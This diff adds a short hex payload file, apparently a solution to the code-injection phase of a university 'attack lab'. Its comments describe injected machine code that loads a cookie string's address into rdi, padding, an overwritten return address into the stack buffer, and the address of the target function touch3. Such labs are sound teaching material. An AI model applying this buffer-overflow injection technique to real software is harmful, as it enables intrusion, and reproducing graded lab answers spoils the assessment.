@@ -1,0 +1,19 @@
+/* movq cookie location -> rdi and retq */
+/* 10 fa 51 55 */
+/* 0x5551fa10 + 0x28 = 0x5551fa38 */
+
+
+48 c7 c7 38 fa 51 55 c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* retaddr of getbuf */
+10 fa 51 55 00 00 00 00
+
+/* retaddr of touch3 */
+/* 0x401f11          */
+
+11 1f 40 00 00 00 00 00
+
+/* Hex translation of cookie */
+32 33 66 33 30 36 64 35 00
